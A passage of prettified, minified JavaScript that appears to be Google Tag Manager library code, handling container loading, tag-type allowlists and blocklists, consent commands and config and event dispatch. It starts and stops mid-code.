    (Yv.prototype.addRestriction = function (a, b, c, d) {
      if (!(d = void 0 !== d && d) || !this.D[b]) {
        var e = Zv(this, b);
        0 === a
          ? d
            ? e._entity.external.push(c)
            : e._entity.internal.push(c)
          : 1 === a &&
            (d ? e._event.external.push(c) : e._event.internal.push(c));
      }
    }),
      (Yv.prototype.getRestrictions = function (a, b) {
        var d,
          e,
          f,
          g,
          c = Zv(this, b);
        return 0 === a
          ? [].concat(
              pa(
                (null == c || null == (d = c._entity) ? void 0 : d.internal) ||
                  []
              ),
              pa(
                (null == c || null == (e = c._entity) ? void 0 : e.external) ||
                  []
              )
            )
          : 1 === a
          ? [].concat(
              pa(
                (null == c || null == (f = c._event) ? void 0 : f.internal) ||
                  []
              ),
              pa(
                (null == c || null == (g = c._event) ? void 0 : g.external) ||
                  []
              )
            )
          : [];
      }),
      (Yv.prototype.getExternalRestrictions = function (a, b) {
        var d,
          e,
          c = Zv(this, b);
        return 0 === a
          ? (null == c || null == (d = c._entity) ? void 0 : d.external) || []
          : (null == c || null == (e = c._event) ? void 0 : e.external) || [];
      }),
      (Yv.prototype.removeExternalRestrictions = function (a) {
        var b = Zv(this, a);
        b._event && (b._event.external = []),
          b._entity && (b._entity.external = []),
          (this.D[a] = !0);
      });
    var $v = new RegExp(
        /^(.*\.)?(google|youtube|blogger|withgoogle)(\.com?)?(\.[a-z]{2})?\.?$/
      ),
      aw = {
        cl: ["ecl"],
        customPixels: ["nonGooglePixels"],
        ecl: ["cl"],
        ehl: ["hl"],
        gaawc: ["googtag"],
        hl: ["ehl"],
        html: [
          "customScripts",
          "customPixels",
          "nonGooglePixels",
          "nonGoogleScripts",
          "nonGoogleIframes",
        ],
        customScripts: [
          "html",
          "customPixels",
          "nonGooglePixels",
          "nonGoogleScripts",
          "nonGoogleIframes",
        ],
        nonGooglePixels: [],
        nonGoogleScripts: ["nonGooglePixels"],
        nonGoogleIframes: ["nonGooglePixels"],
      },
      bw = {
        cl: ["ecl"],
        customPixels: ["customScripts", "html"],
        ecl: ["cl"],
        ehl: ["hl"],
        gaawc: ["googtag"],
        hl: ["ehl"],
        html: ["customScripts"],
        customScripts: ["html"],
        nonGooglePixels: [
          "customPixels",
          "customScripts",
          "html",
          "nonGoogleScripts",
          "nonGoogleIframes",
        ],
        nonGoogleScripts: ["customScripts", "html"],
        nonGoogleIframes: ["customScripts", "html", "nonGoogleScripts"],
      },
      cw =
        "google customPixels customScripts html nonGooglePixels nonGoogleScripts nonGoogleIframes".split(
          " "
        );
    var ew = !1;
    function gw(a, b, c, d, e) {
      if (!hw()) {
        var f = d.siloed ? zj(a) : a;
        if (
          !(function Qj(a) {
            return !!tj().container[a];
          })(f)
        ) {
          var g = "?id=" + encodeURIComponent(a) + "&l=" + gi.Ya,
            k = Hb(a, "GTM-");
          k || (g += "&cx=c"), U(67) && (g += "&gtm=" + co());
          var m = dj();
          m && (g += "&sign=" + gi.Jf);
          var n = c ? "/gtag/js" : "/gtm.js",
            p = cj(b, n + g);
          if (!p) {
            var q = gi.Gd + n;
            m && tc && k
              ? (p = Br(
                  "https://",
                  "http://",
                  (q = tc.replace(/^(?:https?:\/\/)?/i, "").split(/[?#]/)[0]) +
                    g
                ))
              : (p = zi.D ? Ai() + n + g : Br("https://", "http://", q + g));
          }
          d.siloed && Sj({ ctid: f, isDestination: !1 });
          var r = Hj();
          (tj().container[f] = { state: 1, context: d, parent: r }),
            sj({ ctid: f, isDestination: !1 }, e),
            Ac(p);
        }
      }
    }
    function iw(a, b, c, d) {
      if (!hw()) {
        var e = c.siloed ? zj(a) : a;
        if (
          !(function Rj(a) {
            var b = tj().destination[a];
            return !!b && !!b.state;
          })(e)
        )
          if (!c.siloed && Tj())
            (tj().destination[e] = {
              state: 0,
              transportUrl: b,
              context: c,
              parent: Hj(),
            }),
              sj({ ctid: e, isDestination: !0 }, d),
              O(91);
          else {
            var f =
              "/gtag/destination?id=" +
              encodeURIComponent(a) +
              "&l=" +
              gi.Ya +
              "&cx=c";
            U(67) && (f += "&gtm=" + co()), dj() && (f += "&sign=" + gi.Jf);
            var g = cj(b, f);
            g || (g = zi.D ? Ai() + f : Br("https://", "http://", gi.Gd + f)),
              c.siloed && Sj({ ctid: e, isDestination: !0 }),
              (tj().destination[e] = { state: 1, context: c, parent: Hj() }),
              sj({ ctid: e, isDestination: !0 }, d),
              Ac(g);
          }
      }
    }
    function hw() {
      return !1;
    }
    ew = !0;
    var jw = [];
    function kw() {
      var a = Qf.ctid;
      if (a) {
        var c,
          b = vj.oe ? 1 : 0,
          d = Gj(Hj());
        return (
          (c = d && d.context),
          a +
            ";" +
            Qf.canonicalContainerId +
            ";" +
            (c && c.fromContainerExecution ? 1 : 0) +
            ";" +
            ((c && c.source) || 0) +
            ";" +
            b
        );
      }
    }
    function mw() {
      var a = (function lw() {
        var a = Yi(G.location.href);
        return a.hostname + a.pathname;
      })();
      if ((a && bk("dl", encodeURIComponent(a)), U(83))) {
        var b = kw();
        b && bk("tdp", b);
      } else
        bk("tdp", function () {
          return jw.length > 0 ? jw.join(".") : void 0;
        });
      var c = en(!0);
      void 0 !== c && bk("frm", String(c));
    }
    var nw = !1,
      ow = 0,
      pw = [];
    function qw(a) {
      if (!nw) {
        var b = H.createEventObject,
          c = "complete" === H.readyState,
          d = "interactive" === H.readyState;
        if (!a || "readystatechange" !== a.type || c || (!b && d)) {
          nw = !0;
          for (var e = 0; e < pw.length; e++) I(pw[e]);
        }
        pw.push = function () {
          for (var f = za.apply(0, arguments), g = 0; g < f.length; g++)
            I(f[g]);
          return 0;
        };
      }
    }
    function rw() {
      if (!nw && ow < 140) {
        ow++;
        try {
          var a, b;
          null == (b = (a = H.documentElement).doScroll) || b.call(a, "left"),
            qw();
        } catch (c) {
          G.setTimeout(rw, 50);
        }
      }
    }
    function sw(a) {
      nw ? a() : pw.push(a);
    }
    function uw(a, b, c) {
      return {
        entityType: a,
        indexInOriginContainer: b,
        nameInOriginContainer: c,
        originContainerId: Cj(),
      };
    }
    var ww = function (a, b) {
        (this.j = !1),
          (this.K = []),
          (this.eventData = { tags: [] }),
          (this.P = !1),
          (this.D = this.H = 0),
          vw(this, a, b);
      },
      xw = function (a, b, c, d) {
        if (ji.hasOwnProperty(b) || "__zone" === b) return -1;
        var e = {};
        return (
          Ta(d) && (e = h(d, e)),
          (e.id = c),
          (e.status = "timeout"),
          a.eventData.tags.push(e) - 1
        );
      },
      yw = function (a, b, c, d) {
        var e = a.eventData.tags[b];
        e && ((e.status = c), (e.executionTime = d));
      },
      zw = function (a) {
        if (!a.j) {
          for (var b = a.K, c = 0; c < b.length; c++) b[c]();
          (a.j = !0), (a.K.length = 0);
        }
      },
      vw = function (a, b, c) {
        void 0 !== b && a.we(b),
          c &&
            G.setTimeout(function () {
              zw(a);
            }, Number(c));
      };
    ww.prototype.we = function (a) {
      var b = this,
        c = Eb(function () {
          I(function () {
            a(Cj(), b.eventData);
          });
        });
      this.j ? c() : this.K.push(c);
    };
    var Aw = function (a) {
        return (
          a.H++,
          Eb(function () {
            a.D++, a.P && a.D >= a.H && zw(a);
          })
        );
      },
      Ew = function () {
        return G[
          (function Dw() {
            return G.GoogleAnalyticsObject || "ga";
          })()
        ];
      };
    var Nw = ["es", "1"],
      Ow = {},
      Pw = {};
    function Qw(a, b) {
      var c;
      mj &&
        ((c = b.match(/^(gtm|gtag)\./) ? encodeURIComponent(b) : "*"),
        (Ow[a] = [
          ["e", c],
          ["eid", a],
        ]),
        jm(a));
    }
    function Rw(a) {
      var b = a.eventId,
        c = a.mc;
      if (!Ow[b]) return [];
      var d = [];
      return (
        Pw[b] || d.push(Nw), d.push.apply(d, pa(Ow[b])), c && (Pw[b] = !0), d
      );
    }
    var Sw = {},
      Tw = {},
      Uw = {};
    function Vw(a, b, c, d) {
      mj &&
        U(76) &&
        (void 0 !== d && d
          ? ((Uw[b] = Uw[b] || 0), ++Uw[b])
          : void 0 !== c
          ? ((Tw[a] = Tw[a] || {}), (Tw[a][b] = Math.round(c)))
          : ((Sw[a] = Sw[a] || {}), (Sw[a][b] = (Sw[a][b] || 0) + 1)));
    }
    function Ww(a) {
      var f,
        b = a.eventId,
        c = a.mc,
        d = Sw[b] || {},
        e = [];
      for (f in d) d.hasOwnProperty(f) && e.push("" + f + d[f]);
      return c && delete Sw[b], e.length ? [["md", e.join(".")]] : [];
    }
    function Xw(a) {
      var f,
        b = a.eventId,
        c = a.mc,
        d = Tw[b] || {},
        e = [];
      for (f in d) d.hasOwnProperty(f) && e.push("" + f + d[f]);
      return c && delete Tw[b], e.length ? [["mtd", e.join(".")]] : [];
    }
    function Yw() {
      for (
        var a = [], b = ma(Object.keys(Uw)), c = b.next();
        !c.done;
        c = b.next()
      ) {
        var d = c.value;
        a.push("" + d + Uw[d]);
      }
      return a.length ? [["mec", a.join(".")]] : [];
    }
    var Zw = {},
      $w = {};
    function ax(a, b, c) {
      if (mj && b) {
        var d = (function gj(a) {
          var b = String(a[Ke.oa] || "").replace(/_/g, "");
          return Hb(b, "cvt") ? "cvt" : b;
        })(b);
        (Zw[a] = Zw[a] || []), Zw[a].push(c + d);
        var e = (zf(b) ? "1" : "2") + d;
        ($w[a] = $w[a] || []), $w[a].push(e), jm(a);
      }
    }
    function bx(a) {
      var b = a.eventId,
        c = a.mc,
        d = [],
        e = Zw[b] || [];
      e.length && d.push(["tr", e.join(".")]);
      var f = $w[b] || [];
      return (
        f.length && d.push(["ti", f.join(".")]),
        c && (delete Zw[b], delete $w[b]),
        d
      );
    }
    function cx(a, b, c, d) {
      var e = mf[a],
        f = (function dx(a, b, c, d) {
          function e() {
            function w() {
              Qk(3);
              var D = Cb() - E;
              ax(c.id, f, "7"),
                yw(c.ic, A, "exception", D),
                U(68) && Hu.M.Fj,
                C || ((C = !0), k());
            }
            if (f[Ke.Yk]) k();
            else {
              var x = yf(f, c, []),
                y = x[Ke.yk];
              if (null != y)
                for (var B = 0; B < y.length; B++)
                  if (!W(y[B])) return void k();
              var A = xw(c.ic, String(f[Ke.oa]), Number(f[Ke.ve]), x[Ke.Zk]),
                C = !1;
              (x.vtp_gtmOnSuccess = function () {
                if (!C) {
                  C = !0;
                  var D = Cb() - E;
                  ax(c.id, mf[a], "5"),
                    yw(c.ic, A, "success", D),
                    U(68) && Hu.M.Hj,
                    g();
                }
              }),
                (x.vtp_gtmOnFailure = function () {
                  if (!C) {
                    C = !0;
                    var D = Cb() - E;
                    ax(c.id, mf[a], "6"),
                      yw(c.ic, A, "failure", D),
                      U(68) && Hu.M.Gj,
                      k();
                  }
                }),
                (x.vtp_gtmTagId = f.tag_id),
                (x.vtp_gtmEventId = c.id),
                c.priorityId && (x.vtp_gtmPriorityId = c.priorityId),
                ax(c.id, f, "1"),
                U(68);
              var E = Cb();
              try {
                Bf(x, { event: c, index: a, type: 1 });
              } catch (D) {
                w(D);
              }
              U(68) && Hu.M.Ij;
            }
          }
          var f = mf[a],
            g = b.onSuccess,
            k = b.onFailure,
            m = b.terminate;
          if (c.isBlocked(f)) return null;
          var n = Af(f[Ke.Jj], c, []);
          if (n && n.length) {
            var p = n[0],
              q = cx(
                p.index,
                { onSuccess: g, onFailure: k, terminate: m },
                c,
                d
              );
            if (!q) return null;
            (g = q), (k = 2 === p.Qj ? m : q);
          }
          if (f[Ke.vj] || f[Ke.bl]) {
            var r = f[Ke.vj] ? nf : c.bn,
              t = g,
              u = k;
            if (!r[a]) {
              var v = (function ex(a, b, c) {
                var d = [],
                  e = [];
                return (
                  (b[a] = (function fx(a, b, c) {
                    return function (d, e) {
                      a.push(d), b.push(e), c();
                    };
                  })(d, e, c)),
                  {
                    onSuccess: function () {
                      b[a] = gx;
                      for (var f = 0; f < d.length; f++) d[f]();
                    },
                    onFailure: function () {
                      b[a] = hx;
                      for (var f = 0; f < e.length; f++) e[f]();
                    },
                  }
                );
              })(a, r, Eb(e));
              (g = v.onSuccess), (k = v.onFailure);
            }
            return function () {
              r[a](t, u);
            };
          }
          return e;
        })(a, b, c, d);
      if (!f) return null;
      var g = Af(e[Ke.Dj], c, []);
      if (g && g.length) {
        var k = g[0];
        f = cx(
          k.index,
          {
            onSuccess: f,
            onFailure: 1 === k.Qj ? b.terminate : f,
            terminate: b.terminate,
          },
          c,
          d
        );
      }
      return f;
    }
    function gx(a) {
      a();
    }
    function hx(a, b) {
      b();
    }
    function jx(a, b) {
      var c,
        f,
        d = b.fk,
        e = a.fk;
      if (0 !== (c = d > e ? 1 : d < e ? -1 : 0)) f = c;
      else {
        var g = a.pk,
          k = b.pk;
        f = g > k ? 1 : g < k ? -1 : 0;
      }
      return f;
    }
    function ix(a, b) {
      if (mj) {
        var c = function (d) {
          var e = b.isBlocked(mf[d]) ? "3" : "4",
            f = Af(mf[d][Ke.Dj], b, []);
          f && f.length && c(f[0].index), ax(b.id, mf[d], e);
          var g = Af(mf[d][Ke.Jj], b, []);
          g && g.length && c(g[0].index);
        };
        c(a);
      }
    }
    var nx = !1,
      tx = function (a) {
        var b = a["gtm.uniqueEventId"],
          c = a["gtm.priorityId"],
          d = a.event;
        if ((U(68), "gtm.js" === d)) {
          if (nx) return !1;
          nx = !0;
        }
        var e = !1,
          f = (function Xv() {
            var a = Ej();
            return Vv().getRestrictions(1, a);
          })(),
          g = h(a);
        if (
          !f.every(function (t) {
            return t({ originalEventData: g });
          })
        ) {
          if ("gtm.js" !== d && "gtm.init" !== d && "gtm.init_consent" !== d)
            return !1;
          e = !0;
        }
        Qw(b, d);
        var k = a.eventCallback,
          m = a.eventTimeout,
          n = {
            id: b,
            priorityId: c,
            name: d,
            isBlocked: px(g, e),
            bn: [],
            logMacroError: function () {
              O(6), Qk(0);
            },
            cachedModelValues: qx(),
            ic: new ww(function () {
              U(68), k && k.apply(k, [].slice.call(arguments, 0));
            }, m),
            originalEventData: g,
          };
        U(76) && mj && (n.reportMacroDiscrepancy = Vw), U(68) && (n.id, n.name);
        var p = Hf(n);
        U(68) && (n.id, n.name),
          e &&
            (p = (function rx(a) {
              for (var b = [], c = 0; c < a.length; c++)
                if (a[c]) {
                  var d = String(mf[c][Ke.oa]);
                  (ii[d] || void 0 !== mf[c][Ke.fl] || Tv(d, 2)) && (b[c] = !0);
                }
              return b;
            })(p)),
          U(68);
        var q = (function (a, b) {
          for (var c = [], d = 0; d < mf.length; d++)
            if (a[d]) {
              var e = mf[d],
                f = Aw(b.ic);
              try {
                var g = cx(
                  d,
                  { onSuccess: f, onFailure: f, terminate: f },
                  b,
                  d
                );
                if (g) {
                  var k = e[Ke.oa];
                  if (!k)
                    throw Error(
                      "Error: No function name given for function call."
                    );
                  var m = of[k];
                  c.push({
                    pk: d,
                    fk: (m && m.priorityOverride) || Tv(e[Ke.oa], 1) || 0,
                    execute: g,
                  });
                } else ix(d, b), f();
              } catch (p) {
                f();
              }
            }
          c.sort(jx);
          for (var n = 0; n < c.length; n++) c[n].execute();
          return c.length > 0;
        })(p, n);
        return (
          (function (a) {
            (a.P = !0), a.D >= a.H && zw(a);
          })(n.ic),
          ("gtm.js" !== d && "gtm.sync" !== d) || Cj(),
          (function sx(a, b) {
            if (!b) return b;
            for (var c = 0; c < a.length; c++)
              if (a[c] && mf[c] && !ji[String(mf[c][Ke.oa])]) return !0;
            return !1;
          })(p, q) || !1
        );
      };
    function qx() {
      var a = {};
      return (
        (a.event = Li("event", 1)),
        (a.ecommerce = Li("ecommerce", 1)),
        (a.gtm = Li("gtm")),
        (a.eventModel = Li("eventModel")),
        a
      );
    }
    function px(a, b) {
      var c = (function dw() {
        var a = Gi("gtm.allowlist") || Gi("gtm.whitelist");
        a && O(9),
          mi && (a = ["google", "gtagfl", "lcl", "zone"]),
          $v.test(G.location && G.location.hostname) &&
            (mi
              ? O(116)
              : (O(117),
                ew &&
                  ((a = []),
                  window.console &&
                    window.console.log &&
                    window.console.log("GTM blocked. See go/13687728."))));
        var b = a && Gb(zb(a), aw),
          c = Gi("gtm.blocklist") || Gi("gtm.blacklist");
        c || ((c = Gi("tagTypeBlacklist")) && O(3)),
          c ? O(8) : (c = []),
          $v.test(G.location && G.location.hostname) &&
            (c = zb(c)).push(
              "nonGooglePixels",
              "nonGoogleScripts",
              "sandboxedScripts"
            ),
          zb(c).indexOf("google") >= 0 && O(2);
        var d = c && Gb(zb(c), bw),
          e = {};
        return function (f) {
          var g = f && f[Ke.oa];
          if (!g || "string" != typeof g) return !0;
          if (((g = g.replace(/^_*/, "")), void 0 !== e[g])) return e[g];
          var k = wi[g] || [],
            m = !0;
          if (a) {
            var n;
            if ((n = m))
              a: {
                if (b.indexOf(g) < 0) {
                  if (!(k && k.length > 0)) {
                    n = !1;
                    break a;
                  }
                  for (var p = 0; p < k.length; p++)
                    if (b.indexOf(k[p]) < 0) {
                      O(11), (n = !1);
                      break a;
                    }
                }
                n = !0;
              }
            m = n;
          }
          var q = !1;
          if (c) {
            var r = d.indexOf(g) >= 0;
            if (r) q = r;
            else {
              var t = ub(d, k || []);
              t && O(10), (q = t);
            }
          }
          var u = !m || q;
          return (
            u ||
              !(k.indexOf("sandboxedScripts") >= 0) ||
              (b && -1 !== b.indexOf("sandboxedScripts")) ||
              (u = ub(d, cw)),
            (e[g] = u)
          );
        };
      })();
      return function (d) {
        if (c(d)) return !0;
        var e = d && d[Ke.oa];
        if (!e || "string" != typeof e) return !0;
        e = e.replace(/^_*/, "");
        var f,
          g = Ej();
        f = Vv().getRestrictions(0, g);
        var k = a;
        b && ((k = h(a))["gtm.uniqueEventId"] = Number.MAX_SAFE_INTEGER);
        for (
          var m = wi[e] || [], n = ma(f), p = n.next();
          !p.done;
          p = n.next()
        ) {
          var q = p.value;
          try {
            if (!q({ entityId: e, securityGroups: m, originalEventData: k }))
              return !0;
          } catch (r) {
            return !0;
          }
        }
        return !1;
      };
    }
    var ux = 0;
    function vx(a, b) {
      return 1 === arguments.length ? wx("set", a) : wx("set", a, b);
    }
    function wx() {
      return arguments;
    }
    var Mf,
      Ex = function () {
        (this.messages = []), (this.j = []);
      };
    function Fx(a, b, c) {
      (c.eventMetadata = c.eventMetadata || {}),
        (c.eventMetadata.source_canonical_id = Qf.canonicalContainerId),
        Gx().enqueue(a, b, c);
    }
    function Gx() {
      var a = hi.mb;
      return a || ((a = new Ex()), (hi.mb = a)), a;
    }
    (Ex.prototype.enqueue = function (a, b, c) {
      var d = this.messages.length + 1;
      (a["gtm.uniqueEventId"] = b), (a["gtm.priorityId"] = d);
      var f = {
        message: a,
        notBeforeEventId: b,
        priorityId: d,
        messageContext: Object.assign({}, c, {
          eventId: b,
          priorityId: d,
          fromContainerExecution: !0,
        }),
      };
      this.messages.push(f);
      for (var g = 0; g < this.j.length; g++)
        try {
          this.j[g](f);
        } catch (k) {}
    }),
      (Ex.prototype.listen = function (a) {
        this.j.push(a);
      }),
      (Ex.prototype.get = function () {
        for (var a = {}, b = 0; b < this.messages.length; b++) {
          var c = this.messages[b],
            d = a[c.notBeforeEventId];
          d || ((d = []), (a[c.notBeforeEventId] = d)), d.push(c);
        }
        return a;
      }),
      (Ex.prototype.prune = function (a) {
        for (var b = [], c = [], d = 0; d < this.messages.length; d++) {
          var e = this.messages[d];
          e.notBeforeEventId === a ? b.push(e) : c.push(e);
        }
        return (this.messages = c), b;
      });
    var Jx = {},
      Kx = {};
    var Ox = "HA GF G UA AW DC MC".split(" "),
      Px = !1,
      Qx = !1,
      Rx = !1,
      Sx = !1;
    function Tx(a, b) {
      return (
        a.hasOwnProperty("gtm.uniqueEventId") ||
          Object.defineProperty(a, "gtm.uniqueEventId", { value: xi() }),
        (b.eventId = a["gtm.uniqueEventId"]),
        (b.priorityId = a["gtm.priorityId"]),
        { eventId: b.eventId, priorityId: b.priorityId }
      );
    }
    var Ux = void 0,
      Vx = void 0;
    function Wx(a, b, c) {
      var d = h(a, null);
      (d.eventId = void 0),
        (d.inheritParentConfig = void 0),
        Object.keys(b).some(function (f) {
          return void 0 !== b[f];
        }) && O(136);
      var e = h(b, null);
      h(c, e),
        Fx(
          (function xx(a, b) {
            return 1 === arguments.length
              ? wx("config", a)
              : wx("config", a, b);
          })(xj()[0], e),
          a.eventId,
          d
        );
    }
    function Xx(a) {
      for (var b = ma([P.g.jd, P.g.Nb]), c = b.next(); !c.done; c = b.next()) {
        var d = c.value,
          e = (a && a[d]) || rm.D[d];
        if (e) return e;
      }
    }
    var Yx = [
        P.g.jd,
        P.g.Nb,
        P.g.yc,
        P.g.pb,
        P.g.wb,
        P.g.Ba,
        P.g.sa,
        P.g.Pa,
        P.g.Wa,
        P.g.Hb,
      ],
      Zx = {
        config: function (a, b) {
          var c = Tx(a, b);
          if (!(a.length < 2) && l(a[1])) {
            var d = {};
            if (a.length > 2) {
              if ((void 0 !== a[2] && !Ta(a[2])) || a.length > 3) return;
              d = a[2];
            }
            var e = pl(a[1], b.isGtmEvent);
            if (e) {
              var f, g, k;
              a: {
                if (!vj.oe) {
                  var m = Gj(Hj());
                  if (
                    (function Vj(a) {
                      return !!(
                        a &&
                        a.parent &&
                        a.context &&
                        1 === a.context.source &&
                        0 !== a.parent.ctid.indexOf("GTM-")
                      );
                    })(m)
                  ) {
                    var n = m.parent,
                      p = n.isDestination;
                    k = { Fm: Gj(n), sm: p };
                    break a;
                  }
                }
                k = void 0;
              }
              var q = k;
              q && ((f = q.Fm), (g = q.sm)), Qw(c.eventId, "gtag.config");
              var r = e.ia,
                t = e.id !== r;
              if (t ? -1 === Aj().indexOf(r) : -1 === xj().indexOf(r)) {
                if (!b.inheritParentConfig && !d[P.g.Kb]) {
                  var u = Xx(d);
                  if (t)
                    iw(r, u, {
                      source: 2,
                      fromContainerExecution: b.fromContainerExecution,
                    });
                  else if (void 0 !== f && -1 !== f.containers.indexOf(r)) {
                    var v = d;
                    Ux ? Wx(b, v, Ux) : Vx || (Vx = h(v, null));
                  } else
                    gw(r, u, !0, {
                      source: 2,
                      fromContainerExecution: b.fromContainerExecution,
                    });
                }
              } else {
                if (f && (O(128), g && O(130), b.inheritParentConfig)) {
                  var w,
                    x = d;
                  return (
                    Vx
                      ? (Wx(b, Vx, x), (w = !1))
                      : ((!x[P.g.bc] && li && Ux) || (Ux = h(x, null)),
                        (w = !0)),
                    void (w && f.containers && f.containers.join(","))
                  );
                }
                var y = d;
                if (!Rx && ((Rx = !0), Qx))
                  for (var B = ma(Yx), A = B.next(); !A.done; A = B.next())
                    if (y.hasOwnProperty(A.value)) {
                      Pk("erc");
                      break;
                    }
                if (
                  (nj && !wj && (1 === ux && (Zj.mcc = !1), (ux = 2)),
                  (Mk = !0),
                  li && !t && !d[P.g.bc])
                ) {
                  var C = Sx;
                  if (((Sx = !0), C)) return;
                }
                if ((Px || O(43), !b.noTargetGroup))
                  if (t) {
                    !(function Nx(a) {
                      z(Kx, function (b, c) {
                        var d = c.indexOf(a);
                        d >= 0 && c.splice(d, 1);
                      });
                    })(e.id);
                    var E = e.id,
                      D = d[P.g.Zd] || "default";
                    D = String(D).split(",");
                    for (var F = 0; F < D.length; F++) {
                      var L = Kx[D[F]] || [];
                      (Kx[D[F]] = L), L.indexOf(E) < 0 && L.push(E);
                    }
                  } else {
                    !(function Mx(a) {
                      z(Jx, function (b, c) {
                        var d = c.indexOf(a);
                        d >= 0 && c.splice(d, 1);
                      });
                    })(e.id);
                    var M = e.id,
                      R = d[P.g.Zd] || "default";
                    R = R.toString().split(",");
                    for (var V = 0; V < R.length; V++) {
                      var aa = Jx[R[V]] || [];
                      (Jx[R[V]] = aa), aa.indexOf(M) < 0 && aa.push(M);
                    }
                  }
                delete d[P.g.Zd];
                var X = b.eventMetadata || {};
                X.hasOwnProperty("is_external_event") ||
                  (X.is_external_event = !b.fromContainerExecution),
                  (b.eventMetadata = X),
                  delete d[P.g.bd];
                for (var S = t ? [e.id] : Aj(), na = 0; na < S.length; na++) {
                  var la = d,
                    ha = S[na],
                    ya = h(b, null),
                    Na = pl(ha, ya.isGtmEvent);
                  Na && rm.push("config", [la], Na, ya);
                }
              }
            }
          }
        },
        consent: function (a, b) {
          if (3 === a.length) {
            O(39);
            var c = Tx(a, b),
              d = a[1],
              e = a[2];
            b.fromContainerExecution ||
              (e[P.g.O] && O(139), e[P.g.ya] && O(140)),
              "default" === d
                ? (function cl(a) {
                    Ok(), !al && $k && Pk("crc"), (al = !0);
                    var b = a[P.g.Eb];
                    b && O(40);
                    var c = a[P.g.af];
                    c && O(41);
                    for (
                      var d = Array.isArray(b) ? b : [b], e = { Je: 0 };
                      e.Je < d.length;
                      ++(e = { Je: e.Je }).Je
                    )
                      z(
                        a,
                        (function (f) {
                          return function (g, k) {
                            if (g !== P.g.Eb && g !== P.g.af) {
                              var m = d[f.Je],
                                n = Number(c),
                                p = Sk(),
                                q = Tk();
                              (n = void 0 === n ? 0 : n),
                                (yk = !0),
                                zk && ib("TAGGING", 20),
                                rk().default(g, k, m, p, q, n, Bk);
                            }
                          };
                        })(e)
                      );
                  })(e)
                : "update" === d
                ? el(e, c)
                : "declare" === d &&
                  b.fromContainerExecution &&
                  (function bl(a) {
                    for (
                      var b = a[P.g.Eb],
                        c = Array.isArray(b) ? b : [b],
                        d = { Ie: 0 };
                      d.Ie < c.length;
                      ++(d = { Ie: d.Ie }).Ie
                    )
                      z(
                        a,
                        (function (e) {
                          return function (f, g) {
                            if (f !== P.g.Eb) {
                              var k = c[e.Ie],
                                m = Sk(),
                                n = Tk();
                              (zk = !0),
                                yk && ib("TAGGING", 20),
                                rk().declare(f, g, k, m, n);
                            }
                          };
                        })(d)
                      );
                  })(e);
          }
        },
        event: function (a, b) {
          var c = a[1];
          if (!(a.length < 2) && l(c)) {
            var d = void 0;
            if (a.length > 2) {
              if ((!Ta(a[2]) && void 0 !== a[2]) || a.length > 3) return;
              d = a[2];
            }
            var e = d,
              f = {},
              g = ((f.event = c), f);
            e &&
              ((g.eventModel = h(e, null)),
              e[P.g.bd] && (g.eventCallback = e[P.g.bd]),
              e[P.g.Wd] && (g.eventTimeout = e[P.g.Wd]));
            var p,
              k = Tx(a, b),
              m = k.eventId,
              n = k.priorityId;
            if (
              ((g["gtm.uniqueEventId"] = m),
              n && (g["gtm.priorityId"] = n),
              "optimize.callback" === c)
            )
              return (g.eventModel = g.eventModel || {}), g;
            var q = d,
              r = q && q[P.g.ac];
            if (
              (void 0 === r &&
                void 0 === (r = Gi(P.g.ac, 2)) &&
                (r = "default"),
              l(r) || Array.isArray(r))
            ) {
              var u = (function Lx(a, b) {
                  for (
                    var c = [], d = [], e = {}, f = 0;
                    f < a.length;
                    e = { Oh: void 0, wh: void 0 }, f++
                  ) {
                    var g = a[f];
                    if (g.indexOf("-") >= 0)
                      (e.Oh = pl(g, b)),
                        e.Oh &&
                          (sb(
                            Aj(),
                            (function (r) {
                              return function (t) {
                                return r.Oh.ia === t;
                              };
                            })(e)
                          )
                            ? c.push(g)
                            : d.push(g));
                    else {
                      var m = Jx[g] || [];
                      (e.wh = {}),
                        m.forEach(
                          (function (r) {
                            return function (t) {
                              r.wh[t] = !0;
                            };
                          })(e)
                        );
                      for (var n = xj(), p = 0; p < n.length; p++)
                        if (e.wh[n[p]]) {
                          c = c.concat(Aj());
                          break;
                        }
                      var q = Kx[g] || [];
                      q.length && (c = c.concat(q));
                    }
                  }
                  return { vm: c, ym: d };
                })(
                  b.isGtmEvent
                    ? l(r)
                      ? [r]
                      : r
                    : r.toString().replace(/\s+/g, "").split(","),
                  b.isGtmEvent
                ),
                v = u.vm,
                w = u.ym;
              if (w.length)
                for (var x = Xx(q), y = 0; y < w.length; y++) {
                  var B = pl(w[y], b.isGtmEvent);
                  B &&
                    iw(B.ia, x, {
                      source: 3,
                      fromContainerExecution: b.fromContainerExecution,
                    });
                }
              p = ql(v, b.isGtmEvent);
            } else p = void 0;
            var A = p;
            if (A) {
              var C;
              !A.length ||
                (null != (C = b.eventMetadata) && C.em_event) ||
                (Qx = !0),
                Qw(m, c);
              for (var E = [], D = 0; D < A.length; D++) {
                var F = A[D],
                  L = h(b, null);
                if (-1 !== Ox.indexOf(Ij(F.prefix))) {
                  var M = h(d, null),
                    R = L.eventMetadata || {};
                  R.hasOwnProperty("is_external_event") ||
                    (R.is_external_event = !L.fromContainerExecution),
                    (L.eventMetadata = R),
                    delete M[P.g.bd],
                    sm(c, M, F.id, L),
                    nj && !wj && 0 === ux && (bk("mcc", "1"), (ux = 1)),
                    (Mk = !0);
                }
                E.push(F.id);
              }
              return (
                (g.eventModel = g.eventModel || {}),
                A.length > 0
                  ? (g.eventModel[P.g.ac] = E.join())
                  : delete g.eventModel[P.g.ac],
                Px || O(43),
                void 0 === b.noGtmEvent &&
                  b.eventMetadata &&
                  b.eventMetadata.syn_or_mod &&
                  (b.noGtmEvent = !0),
                g.eventModel[P.g.Yb] && (b.noGtmEvent = !0),
                b.noGtmEvent ? void 0 : g
              );
            }
          }
        },
        get: function (a, b) {
          if ((O(53), 4 === a.length && l(a[1]) && l(a[2]) && pb(a[3]))) {
            var c = pl(a[1], b.isGtmEvent),
              d = String(a[2]),
              e = a[3];
            if (c) {
              Px || O(43);
              var f = Xx();
              if (
                sb(Aj(), function (k) {
                  return c.ia === k;
                })
              ) {
                if (-1 !== Ox.indexOf(Ij(c.prefix))) {
                  (Mk = !0), Tx(a, b);
                  var g = {};
                  h(((g[P.g.tb] = d), (g[P.g.Ib] = e), g), null),
                    (function tm(a, b, c, d) {
                      var e = pl(c, d.isGtmEvent);
                      e && rm.push("get", [a, b], e, d);
                    })(
                      d,
                      function (k) {
                        I(function () {
                          e(k);
                        });
                      },
                      c.id,
                      b
                    );
                }
              } else
                iw(c.ia, f, {
                  source: 4,
                  fromContainerExecution: b.fromContainerExecution,
                });
            }
          }
        },
        js: function (a, b) {
